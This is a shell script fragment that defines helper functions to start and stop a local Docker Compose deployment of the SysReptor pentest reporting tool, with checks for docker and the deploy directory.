# Sysreptor helper functions
SYSREPTOR_DEPLOY_DIR="${SYSREPTOR_DEPLOY_DIR:-$HOME/Tools/install_sysreptor/sysreptor/deploy}"

# Fucntion to start a sysreptor Pentesing reporting software on a docker container
sysreptor_start() {
  local deploy="$SYSREPTOR_DEPLOY_DIR"

  if ! command -v docker >/dev/null 2>&1; then
    echo "[sysreptor] Docker is not installed or not in PATH."
    return 1
  fi

  if [ ! -d "$deploy" ]; then
    echo "[sysreptor] Deploy directory not found: $deploy"
    return 1
  fi

  echo "[sysreptor] Starting Sysreptor stack from: $deploy"
  (
    cd "$deploy" || exit 1

    # Prefer docker compose (v2), fall back to docker-compose (v1)
    if docker compose up -d >/dev/null 2>&1; then
      :
    elif command -v docker-compose >/dev/null 2>&1; then
      docker-compose up -d
    else
      echo "[sysreptor] Neither 'docker compose' nor 'docker-compose' available."
      exit 1
    fi

    echo "[sysreptor] Containers:"
    docker compose ps 2>/dev/null || docker-compose ps 2>/dev/null || true
  ) || {
    echo "[sysreptor] Failed to start Sysreptor."
    return 1
  }

  echo "[sysreptor] UI should be available on: http://127.0.0.1:8000/"
}

sysreptor_stop() {
  local deploy="$SYSREPTOR_DEPLOY_DIR"

  if ! command -v docker >/dev/null 2>&1; then
    echo "[sysreptor] Docker not available; nothing to stop."
    return 0
  fi

  if [ ! -d "$deploy" ]; then
    echo "[sysreptor] Deploy directory not found: $deploy (skipping Sysreptor stop)."
    return 0
  fi

  echo "[sysreptor] Stopping Sysreptor stack..."
  (
    cd "$deploy" || exit 0

    # Only try to stop if something is actually running for this project
    if docker compose ps -q 2>/dev/null | grep -q .; then
      docker compose down >/dev/null 2>&1 || \
      (command -v docker-compose >/dev/null 2>&1 && docker-compose down >/dev/null 2>&1)
      echo "[sysreptor] Stack stopped."
    elif command -v docker-compose >/dev/null 2>&1 && docker-compose ps -q 2>/dev/null | grep -q .; then
      docker-compose down >/dev/null 2>&1
      echo "[sysreptor] Stack stopped."
    else
      echo "[sysreptor] No running Sysreptor containers for this project."
    fi
  )
}



